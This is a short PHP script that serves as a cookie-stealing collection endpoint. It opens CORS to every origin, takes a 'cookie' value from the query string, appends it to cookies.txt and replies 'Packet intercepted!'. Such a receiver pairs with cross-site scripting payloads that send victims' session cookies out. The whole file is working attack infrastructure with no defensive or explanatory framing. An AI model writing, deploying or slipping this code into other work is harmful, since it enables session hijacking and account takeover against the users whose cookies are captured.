<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'] . PHP_EOL;
    file_put_contents("cookies.txt", $cookie, FILE_APPEND);
    echo "Packet intercepted!";
} else {
    echo "Listening...";
}
?>
